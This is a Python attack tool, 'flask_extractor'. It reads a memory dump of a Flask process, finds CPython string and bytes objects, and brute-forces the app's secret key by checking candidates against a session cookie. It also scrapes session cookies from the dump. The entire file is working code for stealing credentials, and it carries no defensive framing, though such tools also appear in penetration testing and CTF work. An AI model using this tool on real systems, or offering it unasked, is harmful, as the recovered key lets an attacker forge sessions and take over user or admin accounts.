import flask_unsign
import argparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def namestr(obj, namespace):
    return [name for name in namespace if namespace[name] is obj][0]


def pprint(somevar):
    print(f"{bcolors.OKBLUE}[{bcolors.ENDC}*{bcolors.OKBLUE}]{bcolors.ENDC} {somevar}")

def u64(somestr):
    return int.from_bytes(somestr,"little")

def p64(someint):
    return someint.to_bytes(8,"little")

def find_all(a_str, sub):
    start = 0
    while True:
        start = a_str.find(sub, start)
        if start == -1: return
        yield start
        start += len(sub) # use start += 1 to find overlapping matches

def find_PyType_Type_addr(pages, first_rw, dmp_file):
    #Walk the page and check if the value is between the start and end addr.
    #If it is deref it and figure out if it's pointing to itself at +8
    #If it's not we continue the search
    memfd = open(dmp_file,"rb")
    PyType_Type_addr = -1
    i = 0
    while i < (first_rw["size"]+8):
        to_handle = u64(pages[i:i+8])
        
        #Check if it's in between the pages
        if to_handle < first_rw["mem_start"]:
            i+=8
            continue
        if to_handle > first_rw["mem_end"]:
            i+=8
            continue
        #If it is we find it and check it at +8
        orig_obj_addr = to_handle
        orig_obj_file_off = first_rw["file_start"]+(orig_obj_addr - first_rw["mem_start"])
        memfd.seek(orig_obj_file_off+8)
        #We grab the first 16 bytes to check whether it points at itself

        candidate = u64(memfd.read(8))

        #if the canidate is correct we are done
        if candidate == orig_obj_addr:
            PyType_Type_addr = candidate
            break
        i+=8
    memfd.close()
    return PyType_Type_addr




def find_PyBytes_Type_addr(pages, PyType_Type_addr, second_ro, first_rw, dmp_file):
    memfd = open(dmp_file,"rb")
    
    PyBytes_Type_addr = -1
    i = 0
    while i < (first_rw["size"]):
        to_handle = u64(pages[i:i+8])
        #Check if it's PyType_Type_addr
        if to_handle != PyType_Type_addr:
            i+=8
            continue
        to_handle = u64(pages[i+8:i+16])
        
        #Check if it's superceded by a 0x0
        if to_handle != 0x0:
            i+=8
            continue
        to_handle = u64(pages[i+16:i+24])
        
        #Check if that is superceded by a string in the read-only section
        if (to_handle < second_ro["mem_start"]) or (to_handle > second_ro["mem_end"]):
            i+=8
            continue
        
        #If it is we need to seek to that offset and check what's in there
        ro_handle_file_off = second_ro["file_start"] + (to_handle - second_ro["mem_start"])
        memfd.seek(ro_handle_file_off)
        type_def = memfd.read(6)
        if b'bytes\x00' != type_def:
            i+=8
            continue 

        PyBytes_Type_addr = first_rw["mem_start"]+i-8
        break
    memfd.close()
    return PyBytes_Type_addr

def create_page_to_file_offsets(maps):
    file_off = 0x0
    pages = []
    for entry in maps:
        page_start = int(entry.split("-")[0],16)
        page_end = int(entry.split("-")[1].split(" ")[0],16)
        size =  page_end - page_start
        prots = entry.split(" ")[1]
        tmp_dict = {
            "mem_start":page_start,
            "mem_end":page_end,
            "prots":prots,
            "size":size,
            "file_start":file_off,
            "file_end":file_off+size
        }
        pages.append(tmp_dict)
        file_off+=size

    return pages





def find_PyUnicode_Type_addr(pages, PyType_Type_addr, second_ro, first_rw, dmp_file):
    memfd = open(dmp_file,"rb")
    
    PyUnicode_Type_addr = -1
    i = 0
    while i < (first_rw["size"]):
        to_handle = u64(pages[i:i+8])
        #Check if it's PyType_Type_addr
        if to_handle != PyType_Type_addr:
            i+=8
            continue
        to_handle = u64(pages[i+8:i+16])
        
        #Check if it's superceded by a 0x0
        if to_handle != 0x0:
            i+=8
            continue
        to_handle = u64(pages[i+16:i+24])
        
        #Check if that is superceded by a string in the read-only section
        if (to_handle < second_ro["mem_start"]) or (to_handle > second_ro["mem_end"]):
            i+=8
            continue
        
        #If it is we need to seek to that offset and check what's in there
        ro_handle_file_off = second_ro["file_start"] + (to_handle - second_ro["mem_start"])
        memfd.seek(ro_handle_file_off)
        type_def = memfd.read(4)
        if b'str\x00' != type_def:
            i+=8
            continue 

        PyUnicode_Type_addr = first_rw["mem_start"]+i-8
        break
    memfd.close()
    return PyUnicode_Type_addr


def extract_secret_from_sections_bytes(dmp_file, PyBytes_Type_addr, cookie, secret_key_len):
    #Now that we have the PyBytes_Type_addr we need to find all occurences of it, then trim through them

    with open(dmp_file,"rb") as f:
        dmp_file_contents = f.read()

    all_pybytes_refs = list(find_all(dmp_file_contents,p64(PyBytes_Type_addr)))

    possible_keys = []

    for ref in all_pybytes_refs:
        to_handle = u64(dmp_file_contents[ref+8:ref+16])
        if to_handle != secret_key_len:
            continue
        to_append = dmp_file_contents[ref+24:ref+24+secret_key_len]
        possible_keys.append(to_append)


    secret_key = None
    for key in possible_keys:
        if flask_unsign.verify(cookie,key) == True:
            secret_key = key
            break


    return secret_key

def extract_secret_from_sections_strings(dmp_file, PyUnicode_Type_addr, cookie, secret_key_len):
    with open(dmp_file,"rb") as f:
        dmp_file_contents = f.read()

    all_pyunicode_refs = list(find_all(dmp_file_contents,p64(PyUnicode_Type_addr)))

    possible_keys = []

    for ref in all_pyunicode_refs:
        to_handle = u64(dmp_file_contents[ref+8:ref+16])
        if to_handle != secret_key_len:
            continue
        to_append = dmp_file_contents[ref+0x28:ref+0x28+secret_key_len]
        possible_keys.append(to_append)


    secret_key = None
    for key in possible_keys:
        if flask_unsign.verify(cookie,key) == True:
            secret_key = key
            break

    return secret_key

def get_session_cookie_from_dump(dmp_file):
    with open(dmp_file,"rb") as f:
        dmp_file_contents = f.read()
    
    all_session_refs = list(find_all(dmp_file_contents,b'session='))
    possible_session_cookies = []

    for ref in all_session_refs:
        end = ref + dmp_file_contents[ref:].find(b'\x00')
        to_handle = dmp_file_contents[ref:end]
        if len(to_handle) == len(b'session='):
            continue
        if len(to_handle.split(b'.')) < 3:
            continue
        semicolon_idx = to_handle.find(b';')
        if semicolon_idx == -1:
            continue
        
        possible_session_cookies.append(to_handle[len(b'session='):semicolon_idx])
    return possible_session_cookies


#TODO: Make finding a cookie from the dump a possibility

parser = argparse.ArgumentParser(prog = 'flask_extractor', description = 'Gets the secret key of a specified length from a memory dump from flask_dumper')
parser.add_argument("-f","--dmpfile",type=str,help=".dmp file to extract from",required=True)
parser.add_argument("-m","--mapsfile",type=str,help=".maps file to extract from",required=True)
parser.add_argument("-c","--cookie",type=str,help="Optional. Valid session cookie from service. If none specified, the extractor will try to use one it may be able to find from the dump")
parser.add_argument("-l","--len",type=int,help="Optional. Length of the secret key expected. If none specified the program will try to brute from len 0-256. Setting this value, significantly speeds up the process")
parser.add_argument("-t","--type",type=str,help="Optional. Whether the type of the key is a string or bytes object. If none specified will try to brute force both types. Possible values. 'bytes' 'str'. Setting this values significantly speeds up the process")


args = parser.parse_args()

dmp_file = args.dmpfile
with open(args.mapsfile,"r") as fd:
    maps = fd.readlines()
p_to_f_obj = create_page_to_file_offsets(maps)

cookie = args.cookie
if cookie == None:
    pprint("No cookie specified, trying to find one in the .dmp file")
    cookies = get_session_cookie_from_dump(dmp_file)
    if len(cookies)!=0:
        pprint(f"Found cookie: {cookies[0].decode('UTF-8')}")
        cookie = cookies[0].decode("UTF-8")
    else:
        pprint("Unable to find cookie from memory dump")
        exit(1)

#find the entry for the first read-writable page and the base address of the dump
first_rw = [x for x in p_to_f_obj if x["prots"] == "rw-p"][0]
second_ro = [x for x in p_to_f_obj if x["prots"] == "r--p"][1]

pprint(f"First RW section address start: {first_rw['mem_start']:#x}")
pprint(f"First RW section address end: {first_rw['mem_end']:#x}")
pprint(f"First RW section size: {first_rw['size']:#x}")
pprint(f"Second RO section address start: {second_ro['mem_start']:#x}")
pprint(f"Second RO section address end: {second_ro['mem_end']:#x}")
pprint(f"Second RO section size {second_ro['size']:#x}")

#Grab the first rw pages
with open(dmp_file,"rb") as fd:
    fd.seek(first_rw["file_start"])
    first_rw_pages = fd.read(first_rw['size'])


PyType_Type_addr = find_PyType_Type_addr(first_rw_pages, first_rw,dmp_file)
PyBytes_Type_addr = find_PyBytes_Type_addr(first_rw_pages, PyType_Type_addr, second_ro, first_rw, dmp_file)
PyUnicode_Type_addr = find_PyUnicode_Type_addr(first_rw_pages, PyType_Type_addr, second_ro, first_rw, dmp_file)

pprint(f"PyType_Type addr: {PyType_Type_addr:#x}")
pprint(f"PyBytes_Type addr: {PyBytes_Type_addr:#x}")
pprint(f"PyUnicode_Type_addr: {PyUnicode_Type_addr:#x}")

#Yeaaah this logic could be cleaner but rn idc so hope you're not a never nester

if args.len == None:
    if args.type == None:
        for i in range(1,256):
            pprint(f"Trying to extract from bytes with len {i}")
            secret_key = extract_secret_from_sections_bytes(args.dmpfile,PyBytes_Type_addr,cookie,i)
            if secret_key != None:
                pprint("Found secret key:")
                pprint(secret_key)
                exit(0)
                break
        for i in range(1,256):
            pprint(f"Trying to extract from str with len {i}")
            secret_key = extract_secret_from_sections_strings(args.dmpfile,PyUnicode_Type_addr,cookie,i)
            if secret_key != None:
                pprint("Found secret key:")
                pprint(secret_key)
                exit(0)
                break
    
    if args.type == "bytes":
        for i in range(1,256):
            pprint(f"Trying to extract from bytes with len {i}")
            secret_key = extract_secret_from_sections_bytes(args.dmpfile,PyBytes_Type_addr,cookie,i)
            if secret_key != None:
                pprint("Found secret key:")
                pprint(secret_key)
                exit(0)
                break
    
    if args.type == "str":
        for i in range(1,256):
            pprint(f"Trying to extract from str with len {i}")
            secret_key = extract_secret_from_sections_strings(args.dmpfile,PyUnicode_Type_addr,cookie,i)
            if secret_key != None:
                pprint("Found secret key:")
                pprint(secret_key)
                exit(0)
                break

    if secret_key == None:
        pprint("Failed finding secret key")

else:
    secret_key = None
    if args.type == None:
        secret_key_1 = extract_secret_from_sections_bytes(args.dmpfile,PyBytes_Type_addr,cookie,args.len)
        secret_key_2 = extract_secret_from_sections_strings(args.dmpfile,PyUnicode_Type_addr,cookie,args.len)
        if secret_key_1 != None:
            secret_key = secret_key_1
        elif secret_key_2 != None:
            secret_key = secret_key_2
    
    elif args.type == "bytes":
        secret_key = extract_secret_from_sections_bytes(args.dmpfile,PyBytes_Type_addr,cookie,args.len)
    
    elif args.type == "str":
        secret_key = extract_secret_from_sections_strings(args.dmpfile,PyUnicode_Type_addr,cookie,args.len)
    
    if secret_key == None:
        pprint("Failed finding secret key")
    else:
        pprint("Found secret key:")
        pprint(secret_key)

